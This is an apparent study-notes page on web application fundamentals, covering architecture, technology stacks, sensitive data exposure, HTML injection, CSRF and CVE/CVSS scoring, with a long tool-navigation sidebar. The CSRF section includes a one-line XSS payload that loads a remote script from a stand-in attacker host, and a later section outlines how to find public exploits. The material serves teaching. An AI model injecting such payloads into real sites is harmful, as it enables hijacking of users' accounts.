href="/tools/defense-monitoring/sysmon" class="nav-note " data-astro-cid-gvqsdny3> Sysmon </a><a href="/tools/defense-monitoring/thehive" class="nav-note " data-astro-cid-gvqsdny3> TheHive </a><a href="/tools/defense-monitoring/uncomplicated-firewall-ufw" class="nav-note " data-astro-cid-gvqsdny3> Uncomplicated Firewall UFW </a><a href="/tools/defense-monitoring/windows-defender-firewall" class="nav-note " data-astro-cid-gvqsdny3> Windows Defender Firewall </a> </div> </div><div class="subcat-group" data-open="false" data-astro-cid-gvqsdny3> <div class="subcat-header" data-astro-cid-gvqsdny3> <button class="subcat-toggle" aria-label="Toggle subcategory" data-astro-cid-gvqsdny3> <span class="subcat-chevron" data-astro-cid-gvqsdny3>▶</span> </button> <a href="/tools?filter=Enumeration" class="subcat-label-link " data-astro-cid-gvqsdny3> Enumeration </a> </div> <div class="subcat-body" data-astro-cid-gvqsdny3> <a href="/tools/enumeration/crackmapexec" class="nav-note " data-astro-cid-gvqsdny3> CrackMapExec </a><a href="/tools/enumeration/dnsenum" class="nav-note " data-astro-cid-gvqsdny3> DNSenum </a><a href="/tools/enumeration/enum4linux-ng" class="nav-note " data-astro-cid-gvqsdny3> Enum4linux Ng </a><a href="/tools/enumeration/feroxbuster" class="nav-note " data-astro-cid-gvqsdny3> Feroxbuster </a><a href="/tools/enumeration/gobuster" class="nav-note " data-astro-cid-gvqsdny3> Gobuster </a><a href="/tools/enumeration/netexec" class="nav-note " data-astro-cid-gvqsdny3> NetExec </a><a href="/tools/enumeration/nmap" class="nav-note " data-astro-cid-gvqsdny3> Nmap </a><a href="/tools/enumeration/odat" class="nav-note " data-astro-cid-gvqsdny3> ODAT </a><a href="/tools/enumeration/rdp-sec-check" class="nav-note " data-astro-cid-gvqsdny3> RDP Sec Check </a><a href="/tools/enumeration/rpcclient" class="nav-note " data-astro-cid-gvqsdny3> Rpcclient </a><a href="/tools/enumeration/smtp-user-enum" class="nav-note " data-astro-cid-gvqsdny3> SMTP User Enum </a> </div> </div><div class="subcat-group" data-open="false" data-astro-cid-gvqsdny3> <div class="subcat-header" data-astro-cid-gvqsdny3> <button class="subcat-toggle" aria-label="Toggle subcategory" data-astro-cid-gvqsdny3> <span class="subcat-chevron" data-astro-cid-gvqsdny3>▶</span> </button> <a href="/tools?filter=Forensics" class="subcat-label-link " data-astro-cid-gvqsdny3> Forensics </a> </div> <div class="subcat-body" data-astro-cid-gvqsdny3> <a href="/tools/forensics/capa" class="nav-note " data-astro-cid-gvqsdny3> CAPA </a><a href="/tools/forensics/inetsim" class="nav-note " data-astro-cid-gvqsdny3> INetSim </a><a href="/tools/forensics/oledumppy" class="nav-note " data-astro-cid-gvqsdny3> Oledumppy </a><a href="/tools/forensics/volatility-3" class="nav-note " data-astro-cid-gvqsdny3> Volatility 3 </a> </div> </div><div class="subcat-group" data-open="false" data-astro-cid-gvqsdny3> <div class="subcat-header" data-astro-cid-gvqsdny3> <button class="subcat-toggle" aria-label="Toggle subcategory" data-astro-cid-gvqsdny3> <span class="subcat-chevron" data-astro-cid-gvqsdny3>▶</span> </button> <a href="/tools?filter=Metasploit" class="subcat-label-link " data-astro-cid-gvqsdny3> Metasploit </a> </div> <div class="subcat-body" data-astro-cid-gvqsdny3> <a href="/tools/frameworks/metasploit/metasploit" class="nav-note " data-astro-cid-gvqsdny3> Metasploit </a><a href="/tools/frameworks/metasploit/meterpreter" class="nav-note " data-astro-cid-gvqsdny3> Meterpreter </a><a href="/tools/frameworks/metasploit/msfconsole" class="nav-note " data-astro-cid-gvqsdny3> MSFConsole </a><a href="/tools/frameworks/metasploit/msfvenom" class="nav-note " data-astro-cid-gvqsdny3> MSFVenom </a> </div> </div><div class="subcat-group" data-open="false" data-astro-cid-gvqsdny3> <div class="subcat-header" data-astro-cid-gvqsdny3> <button class="subcat-toggle" aria-label="Toggle subcategory" data-astro-cid-gvqsdny3> <span class="subcat-chevron" data-astro-cid-gvqsdny3>▶</span> </button> <a href="/tools?filter=Network%20Analysis" class="subcat-label-link " data-astro-cid-gvqsdny3> Network Analysis </a> </div> <div class="subcat-body" data-astro-cid-gvqsdny3> <a href="/tools/network-analysis/tcpdump" class="nav-note " data-astro-cid-gvqsdny3> TCPDump </a><a href="/tools/network-analysis/wireshark" class="nav-note " data-astro-cid-gvqsdny3> Wireshark </a> </div> </div><div class="subcat-group" data-open="false" data-astro-cid-gvqsdny3> <div class="subcat-header" data-astro-cid-gvqsdny3> <button class="subcat-toggle" aria-label="Toggle subcategory" data-astro-cid-gvqsdny3> <span class="subcat-chevron" data-astro-cid-gvqsdny3>▶</span> </button> <a href="/tools?filter=Osint%20Recon" class="subcat-label-link " data-astro-cid-gvqsdny3> Osint Recon </a> </div> <div class="subcat-body" data-astro-cid-gvqsdny3> <a href="/tools/osint-recon/dig" class="nav-note " data-astro-cid-gvqsdny3> Dig </a><a href="/tools/osint-recon/finalrecon" class="nav-note " data-astro-cid-gvqsdny3> FinalRecon </a><a href="/tools/osint-recon/nslookup" class="nav-note " data-astro-cid-gvqsdny3> Nslookup </a><a href="/tools/osint-recon/shodan" class="nav-note " data-astro-cid-gvqsdny3> Shodan </a><a href="/tools/osint-recon/whois" class="nav-note " data-astro-cid-gvqsdny3> WHOIS </a> </div> </div><div class="subcat-group" data-open="false" data-astro-cid-gvqsdny3> <div class="subcat-header" data-astro-cid-gvqsdny3> <button class="subcat-toggle" aria-label="Toggle subcategory" data-astro-cid-gvqsdny3> <span class="subcat-chevron" data-astro-cid-gvqsdny3>▶</span> </button> <a href="/tools?filter=Password%20Attacks" class="subcat-label-link " data-astro-cid-gvqsdny3> Password Attacks </a> </div> <div class="subcat-body" data-astro-cid-gvqsdny3> <a href="/tools/password-attacks/hashcat" class="nav-note " data-astro-cid-gvqsdny3> Hashcat </a><a href="/tools/password-attacks/hydra" class="nav-note " data-astro-cid-gvqsdny3> Hydra </a><a href="/tools/password-attacks/johntheripper" class="nav-note " data-astro-cid-gvqsdny3> JohnTheRipper </a> </div> </div><div class="subcat-group" data-open="false" data-astro-cid-gvqsdny3> <div class="subcat-header" data-astro-cid-gvqsdny3> <button class="subcat-toggle" aria-label="Toggle subcategory" data-astro-cid-gvqsdny3> <span class="subcat-chevron" data-astro-cid-gvqsdny3>▶</span> </button> <a href="/tools?filter=Post%20Exploitation" class="subcat-label-link " data-astro-cid-gvqsdny3> Post Exploitation </a> </div> <div class="subcat-body" data-astro-cid-gvqsdny3> <a href="/tools/post-exploitation/evil-winrm" class="nav-note " data-astro-cid-gvqsdny3> Evil Winrm </a><a href="/tools/post-exploitation/peass-ng" class="nav-note " data-astro-cid-gvqsdny3> PEASS Ng </a> </div> </div><div class="subcat-group" data-open="false" data-astro-cid-gvqsdny3> <div class="subcat-header" data-astro-cid-gvqsdny3> <button class="subcat-toggle" aria-label="Toggle subcategory" data-astro-cid-gvqsdny3> <span class="subcat-chevron" data-astro-cid-gvqsdny3>▶</span> </button> <a href="/tools?filter=Utilities" class="subcat-label-link " data-astro-cid-gvqsdny3> Utilities </a> </div> <div class="subcat-body" data-astro-cid-gvqsdny3> <a href="/tools/utilities/curl" class="nav-note " data-astro-cid-gvqsdny3> Curl </a><a href="/tools/utilities/docker" class="nav-note " data-astro-cid-gvqsdny3> Docker </a><a href="/tools/utilities/rsync" class="nav-note " data-astro-cid-gvqsdny3> Rsync </a><a href="/tools/utilities/sqlplus" class="nav-note " data-astro-cid-gvqsdny3> SQLplus </a><a href="/tools/utilities/telnet" class="nav-note " data-astro-cid-gvqsdny3> Telnet </a><a href="/tools/utilities/xfreerdp" class="nav-note " data-astro-cid-gvqsdny3> Xfreerdp </a> </div> </div><div class="subcat-group" data-open="false" data-astro-cid-gvqsdny3> <div class="subcat-header" data-astro-cid-gvqsdny3> <button class="subcat-toggle" aria-label="Toggle subcategory" data-astro-cid-gvqsdny3> <span class="subcat-chevron" data-astro-cid-gvqsdny3>▶</span> </button> <a href="/tools?filter=Vulnerability%20Scanning" class="subcat-label-link " data-astro-cid-gvqsdny3> Vulnerability Scanning </a> </div> <div class="subcat-body" data-astro-cid-gvqsdny3> <a href="/tools/vulnerability-scanning/openvas" class="nav-note " data-astro-cid-gvqsdny3> OpenVAS </a> </div> </div><div class="subcat-group" data-open="false" data-astro-cid-gvqsdny3> <div class="subcat-header" data-astro-cid-gvqsdny3> <button class="subcat-toggle" aria-label="Toggle subcategory" data-astro-cid-gvqsdny3> <span class="subcat-chevron" data-astro-cid-gvqsdny3>▶</span> </button> <a href="/tools?filter=Web%20Testing" class="subcat-label-link " data-astro-cid-gvqsdny3> Web Testing </a> </div> <div class="subcat-body" data-astro-cid-gvqsdny3> <a href="/tools/web-testing/ffuf" class="nav-note " data-astro-cid-gvqsdny3> Ffuf </a><a href="/tools/web-testing/nikto" class="nav-note " data-astro-cid-gvqsdny3> Nikto </a><a href="/tools/web-testing/sqlmap" class="nav-note " data-astro-cid-gvqsdny3> SQLMap </a><a href="/tools/web-testing/wafw00f" class="nav-note " data-astro-cid-gvqsdny3> Wafw00f </a><a href="/tools/web-testing/wenum" class="nav-note " data-astro-cid-gvqsdny3> Wenum </a><a href="/tools/web-testing/wpscan" class="nav-note " data-astro-cid-gvqsdny3> WPScan </a><a href="/tools/web-testing/xsstrike" class="nav-note " data-astro-cid-gvqsdny3> XSStrike </a> </div> </div><div class="subcat-group" data-open="false" data-astro-cid-gvqsdny3> <div class="subcat-header" data-astro-cid-gvqsdny3> <button class="subcat-toggle" aria-label="Toggle subcategory" data-astro-cid-gvqsdny3> <span class="subcat-chevron" data-astro-cid-gvqsdny3>▶</span> </button> <a href="/tools?filter=Burp%20Suite" class="subcat-label-link " data-astro-cid-gvqsdny3> Burp Suite </a> </div> <div class="subcat-body" data-astro-cid-gvqsdny3> <a href="/tools/web-testing/burp-suite/burp-intruder" class="nav-note " data-astro-cid-gvqsdny3> Burp Intruder </a><a href="/tools/web-testing/burp-suite/burp-proxy" class="nav-note " data-astro-cid-gvqsdny3> Burp Proxy </a><a href="/tools/web-testing/burp-suite/burp-repeater" class="nav-note " data-astro-cid-gvqsdny3> Burp Repeater </a><a href="/tools/web-testing/burp-suite/burp-scanner" class="nav-note " data-astro-cid-gvqsdny3> Burp Scanner </a><a href="/tools/web-testing/burp-suite/burp-suite" class="nav-note " data-astro-cid-gvqsdny3> Burp Suite </a> </div> </div><div class="subcat-group" data-open="false" data-astro-cid-gvqsdny3> <div class="subcat-header" data-astro-cid-gvqsdny3> <button class="subcat-toggle" aria-label="Toggle subcategory" data-astro-cid-gvqsdny3> <span class="subcat-chevron" data-astro-cid-gvqsdny3>▶</span> </button> <a href="/tools?filter=Owasp%20Zap" class="subcat-label-link " data-astro-cid-gvqsdny3> Owasp Zap </a> </div> <div class="subcat-body" data-astro-cid-gvqsdny3> <a href="/tools/web-testing/owasp-zap/owasp-zap" class="nav-note " data-astro-cid-gvqsdny3> OWASP ZAP </a><a href="/tools/web-testing/owasp-zap/zap-fuzzer" class="nav-note " data-astro-cid-gvqsdny3> ZAP Fuzzer </a><a href="/tools/web-testing/owasp-zap/zap-proxy" class="nav-note " data-astro-cid-gvqsdny3> ZAP Proxy </a><a href="/tools/web-testing/owasp-zap/zap-scanner" class="nav-note " data-astro-cid-gvqsdny3> ZAP Scanner </a> </div> </div> </div> </div><div class="cat-group" data-open="false" data-astro-cid-gvqsdny3> <div class="cat-header" data-astro-cid-gvqsdny3> <button class="cat-toggle" aria-label="Toggle category" data-astro-cid-gvqsdny3> <span class="cat-chevron" data-astro-cid-gvqsdny3>▶</span> </button> <a href="/labs" class="cat-label-link " data-astro-cid-gvqsdny3> Labs </a> <span class="cat-count" data-astro-cid-gvqsdny3>7</span> </div> <div class="cat-body" data-astro-cid-gvqsdny3> <div class="subcat-group" data-open="false" data-astro-cid-gvqsdny3> <div class="subcat-header" data-astro-cid-gvqsdny3> <button class="subcat-toggle" aria-label="Toggle subcategory" data-astro-cid-gvqsdny3> <span class="subcat-chevron" data-astro-cid-gvqsdny3>▶</span> </button> <a href="/labs?filter=Cjca" class="subcat-label-link " data-astro-cid-gvqsdny3> Cjca </a> </div> <div class="subcat-body" data-astro-cid-gvqsdny3> <a href="/labs/hackthebox/exams/cjca/cjca-siem-triage" class="nav-note " data-astro-cid-gvqsdny3> CJCA SIEM Triage </a><a href="/labs/hackthebox/exams/cjca/htb-cjca-exam---april-2026" class="nav-note " data-astro-cid-gvqsdny3> HTB CJCA Exam   April 2026 </a> </div> </div><div class="subcat-group" data-open="false" data-astro-cid-gvqsdny3> <div class="subcat-header" data-astro-cid-gvqsdny3> <button class="subcat-toggle" aria-label="Toggle subcategory" data-astro-cid-gvqsdny3> <span class="subcat-chevron" data-astro-cid-gvqsdny3>▶</span> </button> <a href="/labs?filter=Machines" class="subcat-label-link " data-astro-cid-gvqsdny3> Machines </a> </div> <div class="subcat-body" data-astro-cid-gvqsdny3> <a href="/labs/hackthebox/exams/cjca/machines/nix01" class="nav-note " data-astro-cid-gvqsdny3> NIX01 </a><a href="/labs/hackthebox/exams/cjca/machines/nix02" class="nav-note " data-astro-cid-gvqsdny3> NIX02 </a><a href="/labs/hackthebox/exams/cjca/machines/web01" class="nav-note " data-astro-cid-gvqsdny3> WEB01 </a><a href="/labs/hackthebox/exams/cjca/machines/win01" class="nav-note " data-astro-cid-gvqsdny3> WIN01 </a><a href="/labs/hackthebox/exams/cjca/machines/win02" class="nav-note " data-astro-cid-gvqsdny3> WIN02 </a> </div> </div> </div> </div><div class="cat-group" data-open="false" data-astro-cid-gvqsdny3> <div class="cat-header" data-astro-cid-gvqsdny3> <button class="cat-toggle" aria-label="Toggle category" data-astro-cid-gvqsdny3> <span class="cat-chevron" data-astro-cid-gvqsdny3>▶</span> </button> <a href="/resources" class="cat-label-link " data-astro-cid-gvqsdny3> Resources </a> <span class="cat-count" data-astro-cid-gvqsdny3>6</span> </div> <div class="cat-body" data-astro-cid-gvqsdny3> <a href="/resources/common-distros" class="nav-note " data-astro-cid-gvqsdny3> Common Distros </a><a href="/resources/ctf-methodology" class="nav-note " data-astro-cid-gvqsdny3> CTF Methodology </a><a href="/resources/cyber-resources" class="nav-note " data-astro-cid-gvqsdny3> Cyber Resources </a><a href="/resources/github-repositories" class="nav-note " data-astro-cid-gvqsdny3> Github Repositories </a><a href="/resources/obsidian-guides" class="nav-note " data-astro-cid-gvqsdny3> Obsidian Guides </a><a href="/resources/try-hack-me-rooms" class="nav-note " data-astro-cid-gvqsdny3> Try Hack Me Rooms </a> </div> </div> </nav>  <script type="module">document.querySelectorAll(".cat-toggle").forEach(e=>{e.addEventListener("click",()=>{const t=e.closest(".cat-group");t.dataset.open=t.dataset.open==="true"?"false":"true"})});document.querySelectorAll(".subcat-toggle").forEach(e=>{e.addEventListener("click",()=>{const t=e.closest(".subcat-group");t.dataset.open=t.dataset.open==="true"?"false":"true"})});</script> </nav> </div> </aside> <button class="sidebar-toggle" id="sidebar-toggle" aria-label="Toggle sidebar" data-astro-cid-o5gmpz7g>‹</button> <div class="note-gap" data-astro-cid-o5gmpz7g></div> <main class="note-main" data-astro-cid-o5gmpz7g> <div class="note-content" data-astro-cid-o5gmpz7g> <div class="note-meta" data-astro-cid-o5gmpz7g> <span class="note-category" data-astro-cid-o5gmpz7g>knowledge</span>  </div>    <hr>
+<h2 id="overview">Overview</h2>
+<p>Web applications are dynamic browser-based programs served over HTTP/HTTPS that combine front-end and back-end components to deliver interactive functionality. Unlike static websites (Web 1.0) that serve fixed content, web applications (Web 2.0) process user input, generate dynamic responses, and persist data. They run in any browser across any operating system, are updated server-side without client involvement, and are widely deployed — making them a high-value attack surface accessible to anyone on the internet. Common web application attack vectors include SQL injection, file upload abuse, unrestricted API access, broken access controls, and client-side scripting attacks.</p>
+<hr>
+<h2 id="terminology">Terminology</h2>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Term</th><th>Definition</th></tr></thead><tbody><tr><td>Front-End</td><td>Browser-rendered client-side interface built with HTML, CSS, and JavaScript</td></tr><tr><td>Back-End</td><td>Server-side logic that processes requests, queries databases, and returns responses</td></tr><tr><td>DOM (Document Object Model)</td><td>Browser’s structured representation of an HTML page; manipulated by JavaScript</td></tr><tr><td>API Endpoint</td><td>URL on the server that handles specific requests from the client</td></tr><tr><td>Sensitive Data Exposure</td><td>When applications fail to protect sensitive information, often visible in page source</td></tr><tr><td>HTML Injection</td><td>Client-side attack where unsanitized user input is rendered as HTML on the page</td></tr><tr><td>Web 1.0</td><td>Early generation of the web featuring static, read-only pages with no user interaction</td></tr><tr><td>Web 2.0</td><td>Modern interactive web featuring dynamic content, user-generated data, and API-driven applications</td></tr><tr><td>CVE</td><td>Common Vulnerabilities and Exposures; standardized identifier for known security vulnerabilities</td></tr><tr><td>CVSS</td><td>Common Vulnerability Scoring System; 0–10 severity score assigned to vulnerabilities</td></tr><tr><td>Microservices</td><td>Architecture where an application is decomposed into small, independently deployable services</td></tr><tr><td>3-Tier Architecture</td><td>Separates a web application into Presentation, Application, and Data layers</td></tr><tr><td>Technology Stack</td><td>Combined set of technologies used to build and run a web application (e.g., LAMP, WINS)</td></tr></tbody></table>
+<hr>
+<h2 id="core-concepts">Core Concepts</h2>
+<p>Request and Response</p>
+<h3 id="web-application-architecture">Web Application Architecture</h3>
+<p>Web applications are built on layered infrastructure combining servers, databases, and networking components. Three classification models describe how these components are structured and related.</p>
+<h4 id="infrastructure-models">Infrastructure Models</h4>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Model</th><th>Description</th><th>Notes</th></tr></thead><tbody><tr><td>Client-Server</td><td>Client requests resources; server processes and responds</td><td>Standard model for most web apps</td></tr><tr><td>One Server</td><td>All components (web server, DB, app logic) on a single host</td><td>Simple but no fault tolerance</td></tr><tr><td>Many Servers — One Database</td><td>Multiple app servers share a centralized database</td><td>Segmentation and redundancy; DB is still a single point of failure</td></tr><tr><td>Many Servers — Many Databases</td><td>Fully distributed; each server has its own database</td><td>Best security and redundancy; most complex to manage</td></tr></tbody></table>
+<h4 id="component-breakdown">Component Breakdown</h4>
+<p>Web applications consist of four layers of components:</p>
+<ol>
+<li><strong>Client</strong> — browser rendering front-end code</li>
+<li><strong>Server</strong> — web server, application logic, and database</li>
+<li><strong>Services</strong> — third-party integrations and microservices</li>
+<li><strong>Functions</strong> — serverless functions hosted on cloud platforms</li>
+</ol>
+<h4 id="3-tier-architecture">3-Tier Architecture</h4>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Layer</th><th>Role</th></tr></thead><tbody><tr><td>Presentation</td><td>UI components — HTML, CSS, JavaScript rendered in the browser</td></tr><tr><td>Application</td><td>Business logic — validates requests, enforces rules, coordinates data access</td></tr><tr><td>Data</td><td>Persistence — database storage and retrieval</td></tr></tbody></table>
+<h4 id="microservices">Microservices</h4>
+<p>A microservices architecture decomposes a web application into small, independent services (e.g., registration, search, payments, ratings). Each service handles a single function, stores its own data, and communicates with other services via stateless APIs. Services can be written in different programming languages and scaled independently. This pattern is also called Service-Oriented Architecture (SOA).</p>
+<h4 id="serverless">Serverless</h4>
+<p>Serverless architectures abstract the server layer entirely. Developers deploy application logic as discrete functions to cloud providers (AWS Lambda, Azure Functions, Google Cloud Functions). The provider manages scaling, availability, and infrastructure — often using containerized environments internally.</p>
+<hr>
+<h3 id="front-end-technologies">Front-End Technologies</h3>
+<h4 id="html-hypertext-markup-language">HTML (HyperText Markup Language)</h4>
+<p>Defines the structure and content of a webpage.
+HTML Snippet</p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Element</th><th>Purpose</th></tr></thead><tbody><tr><td>DOCTYPE HTML</td><td>Declares HTML5 document type</td></tr><tr><td>html</td><td>Root element of the page</td></tr><tr><td>head</td><td>Contains metadata and page information</td></tr><tr><td>body</td><td>Contains all visible page content</td></tr><tr><td>h1</td><td>Top-level heading</td></tr><tr><td>p</td><td>Paragraph text</td></tr></tbody></table>
+<p>Common attributes:</p>
+<ul>
+<li><code>img src</code> — specifies image source</li>
+<li><code>p class</code> — applies a CSS class</li>
+<li><code>p id</code> — assigns a unique identifier</li>
+</ul>
+<p><strong>URL Encoding</strong>
+Special and unsafe characters in URLs are percent-encoded: replaced with <code>%</code> followed by two hex digits. Browsers decode these automatically. Common encodings: <code>%20</code> = space, <code>%3C</code> = <code>&#x3C;</code>, <code>%3E</code> = <code>></code>. Burp Suite’s Decoder and online tools can encode/decode values during testing.</p>
+<p><strong>DOM (Document Object Model)</strong>
+The DOM is the browser’s structured representation of the HTML page. JavaScript interacts with it using standard references like <code>document.head</code>, <code>document.body</code>, or <code>document.getElementById()</code>. The DOM is defined in three parts:</p>
+<ul>
+<li>Core DOM — standard model for any document type</li>
+<li>XML DOM — extended model for XML documents</li>
+<li>HTML DOM — optimized model for HTML pages</li>
+</ul>
+<h4 id="css-cascading-style-sheets">CSS (Cascading Style Sheets)</h4>
+<ul>
+<li>Controls visual presentation, layout, and styling of HTML elements</li>
+<li>Separates content (HTML) from design (CSS)</li>
+<li>Common CSS frameworks that speed development: Bootstrap, SASS, Foundation, Bulma, Pure</li>
+</ul>
+<h4 id="javascript-js">JavaScript (JS)</h4>
+<ul>
+<li>Enables interactivity and dynamic content updates in the browser</li>
+<li>Can manipulate DOM elements in real time</li>
+<li>Server-side use via Node.js; front-end frameworks: Angular, React, Vue, jQuery</li>
+<li>See <a href="/knowledge/Web-Security/JavaScript-Essentials">JavaScript Essentials</a></li>
+</ul>
+<hr>
+<h3 id="back-end-technologies">Back-End Technologies</h3>
+<p>The back-end comprises all server-side components that process requests, store data, and generate responses.</p>
+<h4 id="web-servers">Web Servers</h4>
+<p>Web servers handle incoming HTTP requests and route them to the appropriate application logic.</p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Server</th><th>Market Share</th><th>Notes</th></tr></thead><tbody><tr><td>Apache (httpd)</td><td>~40%</td><td>Open-source; default on Linux; supports PHP, Python, Perl, .NET via modules (e.g., <code>mod_php</code>)</td></tr><tr><td>Nginx</td><td>~30%</td><td>Async architecture; optimized for high concurrency with low CPU and memory overhead</td></tr><tr><td>IIS (Internet Information Services)</td><td>~15%</td><td>Microsoft; runs on Windows Server; native Active Directory integration; supports .NET, PHP, FTP</td></tr></tbody></table>
+<p>Other notable servers: Apache Tomcat (Java web applications), Node.js (server-side JavaScript).</p>
+<h4 id="common-technology-stacks">Common Technology Stacks</h4>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Stack</th><th>Components</th></tr></thead><tbody><tr><td>LAMP</td><td>Linux, Apache, MySQL, PHP</td></tr><tr><td>WAMP</td><td>Windows, Apache, MySQL, PHP</td></tr><tr><td>WINS</td><td>Windows, IIS, .NET, SQL Server</td></tr><tr><td>MAMP</td><td>macOS, Apache, MySQL, PHP</td></tr><tr><td>XAMPP</td><td>Cross-platform, Apache, MySQL, PHP/Perl</td></tr></tbody></table>
+<h4 id="databases">Databases</h4>
+<p>Web applications use databases to store content, users, and application state. See <a href="/knowledge/Web-Security/SQL-Fundamentals">SQL Fundamentals</a> for full SQL/NoSQL coverage.</p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Type</th><th>Examples</th></tr></thead><tbody><tr><td>Relational (SQL)</td><td>MySQL, MSSQL, Oracle, PostgreSQL, MariaDB</td></tr><tr><td>Non-Relational (NoSQL)</td><td>MongoDB, ElasticSearch, Apache Cassandra, Redis</td></tr></tbody></table>
+<h4 id="development-frameworks">Development Frameworks</h4>
+<p>Frameworks provide scaffolding and structure to accelerate back-end development.</p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Framework</th><th>Language</th><th>Notable Users</th></tr></thead><tbody><tr><td>Laravel</td><td>PHP</td><td>Startups and small-to-medium companies</td></tr><tr><td>Express</td><td>Node.js</td><td>PayPal, Yahoo, Uber, IBM</td></tr><tr><td>Django</td><td>Python</td><td>Google, YouTube, Instagram, Pinterest</td></tr><tr><td>Rails (Ruby on Rails)</td><td>Ruby</td><td>GitHub, Twitch, Airbnb</td></tr><tr><td>Spring</td><td>Java</td><td>Enterprise applications</td></tr><tr><td>ASP.NET</td><td>C#</td><td>Microsoft ecosystem, enterprise</td></tr></tbody></table>
+<p>Large organizations typically use multiple frameworks rather than a single stack.</p>
+<hr>
+<h3 id="security-considerations">Security Considerations</h3>
+<h4 id="sensitive-data-exposure">Sensitive Data Exposure</h4>
+<ul>
+<li>Occurs when applications fail to protect sensitive information on the front-end</li>
+<li>Commonly visible in HTML source, JavaScript files, or API responses</li>
+<li>Access page source: right-click → View Page Source, <code>Ctrl+U</code>, or intercept in Burp Suite</li>
+</ul>
+<p>Items to look for during recon:</p>
+<ul>
+<li>Hardcoded credentials or API keys</li>
+<li>Password hashes in HTML or JS responses</li>
+<li>Internal comments revealing application logic</li>
+<li>Hidden links, directories, or admin panels</li>
+<li>Exposed user data or PII in responses</li>
+</ul>
+<p>Prevention: include only necessary code in front-end; obfuscate or minify JavaScript; review all source before deployment.</p>
+<h4 id="html-injection">HTML Injection</h4>
+<p>HTML Injection</p>
+<ul>
+<li>Occurs when unsanitized user input is rendered as HTML on the page</li>
+<li>Client-side attack targeting front-end rendering</li>
+<li>Can deface visible content or escalate into XSS when JavaScript is injectable</li>
+<li>Prevention: sanitize and encode all user input before rendering</li>
+</ul>
+<h4 id="cross-site-request-forgery-csrf">Cross-Site Request Forgery (CSRF)</h4>
+<p>CSRF tricks an authenticated user’s browser into making a forged request to a web application, performing unintended actions on their behalf. It commonly leverages <a href="/techniques/XSS">XSS</a> to automatically execute the forged request.</p>
+<p><strong>Common scenario:</strong> An attacker stores a script that changes the victim’s password to a known value — when any authenticated user views the affected page, the password change fires silently.</p>
+<p>Loading a remote exploit payload: <code>">&#x3C;script src=//attacker.example.com/exploit.js>&#x3C;/script></code></p>
+<p>Prevention:</p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Method</th><th>Description</th></tr></thead><tbody><tr><td>CSRF Tokens</td><td>Unique per-session tokens required for each state-changing request</td></tr><tr><td>SameSite Cookies</td><td><code>SameSite=Strict</code> or <code>Lax</code> prevents cookies being sent on cross-origin requests</td></tr><tr><td>Re-authentication</td><td>Require password confirmation before sensitive operations</td></tr><tr><td>Input Sanitization</td><td>Remove special characters before storing or rendering user input</td></tr><tr><td>Input Validation</td><td>Verify submitted input matches expected format before processing</td></tr></tbody></table>
+<p>Modern browsers implement partial CSRF defenses but server-side validation remains required.</p>
+<hr>
+<h3 id="public-vulnerabilities">Public Vulnerabilities</h3>
+<p>Web applications often share codebases — a vulnerability in a popular platform (e.g., WordPress, Joomla, OpenCart) affects every installation running that version.</p>
+<h4 id="cves-common-vulnerabilities-and-exposures">CVEs (Common Vulnerabilities and Exposures)</h4>
+<p>CVEs are standardized identifiers assigned to publicly known security vulnerabilities. Each entry documents the affected software, version range, and impact. Proof-of-concept (PoC) exploits are frequently published alongside CVEs.</p>
+<p>Finding and using public CVEs:</p>
+<ol>
+<li>Identify the version of the web application (source code, meta tags, repository headers, or error pages)</li>
+<li>Search public exploit databases for matching CVEs — include plugins and third-party components</li>
+<li>Prioritize CVEs with high CVSS scores (8–10) or those leading to Remote Code Execution; use lower-scoring CVEs when high-severity ones are not available</li>
+</ol>
+<p><strong>Exploit Databases:</strong></p>
+<ul>
+<li>Exploit-DB (exploit-db.com)</li>
+<li>Rapid7 Vulnerability Database</li>
+<li>Vulnerability Lab</li>
+</ul>
+<h4 id="cvss-common-vulnerability-scoring-system">CVSS (Common Vulnerability Scoring System)</h4>
+<p>Open-source industry standard for rating vulnerability severity on a 0–10 scale.</p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Score Range</th><th>Severity</th></tr></thead><tbody><tr><td>0.0</td><td>None</td></tr><tr><td>0.1–3.9</td><td>Low</td></tr><tr><td>4.0–6.9</td><td>Medium</td></tr><tr><td>7.0–8.9</td><td>High</td></tr><tr><td>9.0–10.0</td><td>Critical</td></tr></tbody></table>
+<p>CVSS uses Base, Temporal, and Environmental metrics. The National Vulnerability Database (NVD) publishes base scores only — temporal and environmental scores vary by organization. CVSS v3.0 and v2.0 use different scoring formulas. Reference: <a href="https://www.first.org/cvss/user-guide">https://www.first.org/cvss/user-guide</a></p>
+<hr>
+<h2 id="related-concepts">Related Concepts</h2>
+<ul>
+<li><a href="/knowledge/Networking/HTTP-HTTPS">HTTP &#x26; HTTPS</a></li>
+<li><a href="/knowledge/Networking/DNS-Domain-Name-System">DNS (Domain Name System)</a></li>
+<li><a href="/knowledge/Networking/TLS-SSL">TLS &#x26; SSL</a></li>
+<li><a href="/knowledge/Web-Security/JavaScript-Essentials">JavaScript Essentials</a></li>
+<li><a href="/knowledge/Web-Security/OWASP-Top-10---2021">OWASP Top 10 - 2021</a></li>
+<li><a href="/knowledge/Web-Security/SQL-Fundamentals">SQL Fundamentals</a></li>
+</ul>
